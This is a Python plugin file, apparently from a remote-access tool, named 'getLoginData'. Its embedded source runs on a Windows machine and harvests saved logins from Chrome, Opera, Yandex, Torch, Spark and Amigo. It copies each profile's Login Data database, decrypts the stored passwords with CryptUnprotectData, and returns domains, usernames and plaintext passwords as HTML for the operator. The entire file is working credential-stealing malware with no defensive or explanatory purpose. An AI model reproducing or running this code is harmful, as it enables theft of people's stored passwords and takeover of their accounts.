plugin_name = r"""getLoginData"""
plugin_description = r"""get login data from browsers"""
plugin_type = r"""remote"""
plugin_source = r"""
# coding=utf-8
cprofile = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Profile 6', 'Profile 7',
            'Profile 8', 'Profile 9', 'Profile 10', 'Profile 11', 'Profile 12', 'Profile 13', 'Profile 14', 'Profile 15', 'Profile 16', 'Profile 17', 'Profile 18', 'Profile 19', 'Profile 20', 'Profile 21', 'Profile 22', 'Profile 23', 'Profile 24', 'Profile 25', 'Profile 26', 'Profile 27', 'Profile 28', 'Profile 29', 'Profile 30', ]
yprofile = cprofile
tprofile = cprofile

_SHGetFolderPath = windll.shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND,
                            ctypes.c_int,
                            wintypes.HANDLE,
                            wintypes.DWORD, wintypes.LPCWSTR]


path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)

result = _SHGetFolderPath(0,28, 0, 0, path_buf)
local= path_buf.value.encode('utf-8')
result = _SHGetFolderPath(0,26, 0, 0, path_buf)
roaming =  path_buf.value.encode('utf-8')
main = []

if os.path.exists(local + '\\Google\\Chrome\\User Data\\'):
    for val in cprofile:
        try:
            chrome_logindata = local + '\\Google\\Chrome\\User Data\\' + val + '\\Login Data'
            if os.path.exists('tempc.db'):
                os.remove('tempc.db')
            shutil.copy(chrome_logindata, 'tempc.db')
            connection = sqlite3.connect('tempc.db')
            sessions = []
            resultc = ''
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

                values = v.fetchall()
                for info in values:
                    payload = {
                        'domain': info[0],
                        'username': info[1].encode('utf-8'),
                        'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                    }
                    resultc += '<br><br>###CHROME LOGIN DATA - {}###<br>{}<br>{}<br>{}'.format(val, payload['domain'],
                                                                                             payload['username'],
                                                                                             payload['password'])
            connection.close()
            os.remove('tempc.db')
            main.append(resultc)
        except:
            pass

if os.path.exists(roaming + '\\Opera Software\\Opera Stable\\'):
    try:
        opera_logindata = roaming + '\\Opera Software\\Opera Stable\\Login Data'
        if os.path.exists('tempo.db'):
            os.remove('tempo.db')
        shutil.copy(opera_logindata, 'tempo.db')
        connection = sqlite3.connect('tempo.db')
        sessions = []
        resulto = ''
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

            values = v.fetchall()
            for info in values:
                payload = {
                        'domain': info[0],
                        'username': info[1].encode('utf-8'),
                        'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                }
                resulto += '<br><br>###OPERA LOGIN DATA###<br>{}<br>{}<br>{}'.format(payload['domain'], payload['username'], payload['password'])
        connection.close()
        os.remove('tempo.db')
        main.append(resulto)
    except:
            pass

if os.path.exists(local + '\\Yandex\\YandexBrowser\\User Data\\'):
    for val in yprofile:
        try:
            yandex_logindata = local + '\\Yandex\\YandexBrowser\\User Data\\' + val + '\\Login Data'
            if os.path.exists('tempy.db'):
                os.remove('tempy.db')
            shutil.copy(yandex_logindata, 'tempy.db')
            connection = sqlite3.connect('tempy.db')
            sessions = []
            resulty = ''
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

                values = v.fetchall()
                for info in values:
                    payload = {
                            'domain': info[0],
                            'username': info[1].encode('utf-8'),
                            'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                    }
                    resulty += '<br><br>###YANDEX LOGIN DATA - {}###<br>{}<br>{}<br>{}'.format(val, payload['domain'], payload['username'], payload['password'])
            connection.close()
            os.remove('tempy.db')
            main.append(resulty)
        except:
            pass

if os.path.exists(local + '\\Torch\\User Data\\'):
    for val in tprofile:
        try:
            torch_logindata = local + '\\Torch\\User Data\\' + val + '\\Login Data'
            if os.path.exists('tempt.db'):
                os.remove('tempt.db')
            shutil.copy(torch_logindata, 'tempt.db')
            connection = sqlite3.connect('tempt.db')
            sessions = []
            resulty = ''
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

                values = v.fetchall()
                for info in values:
                    payload = {
                            'domain': info[0],
                            'username': info[1].encode('utf-8'),
                            'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                    }
                    resulty += '<br><br>###TORCH LOGIN DATA - {}###<br>{}<br>{}<br>{}'.format(val, payload['domain'], payload['username'], payload['password'])
            connection.close()
            os.remove('tempt.db')
            main.append(resulty)
        except:
            pass

if os.path.exists(local + '\\Spark\\User Data\\'):
    for val in tprofile:
        try:
            spark_logindata = local + '\\Spark\\User Data\\' + val + '\\Login Data'
            if os.path.exists('temps.db'):
                os.remove('temps.db')
            shutil.copy(spark_logindata, 'temps.db')
            connection = sqlite3.connect('temps.db')
            sessions = []
            resulty = ''
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

                values = v.fetchall()
                for info in values:
                    payload = {
                            'domain': info[0],
                            'username': info[1].encode('utf-8'),
                            'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                    }
                    resulty += '<br><br>###Spark LOGIN DATA - {}###<br>{}<br>{}<br>{}'.format(val, payload['domain'], payload['username'], payload['password'])
            connection.close()
            os.remove('temps.db')
            main.append(resulty)
        except:
            pass

if os.path.exists(local + '\\Amigo\\User Data\\'):
    for val in tprofile:
        try:
            amigo_logindata = local + '\\Amigo\\User Data\\' + val + '\\Login Data'
            if os.path.exists('tempa.db'):
                os.remove('tempa.db')
            shutil.copy(amigo_logindata, 'tempa.db')
            connection = sqlite3.connect('tempa.db')
            sessions = []
            resulty = ''
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url,username_value,password_value FROM logins')

                values = v.fetchall()
                for info in values:
                    payload = {
                            'domain': info[0],
                            'username': info[1].encode('utf-8'),
                            'password': win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1],

                    }
                    resulty += '<br><br>###Amigo LOGIN DATA - {}###<br>{}<br>{}<br>{}'.format(val, payload['domain'], payload['username'], payload['password'])
            connection.close()
            os.remove('tempa.db')
            main.append(resulty)
        except:
            pass
mprint = main

"""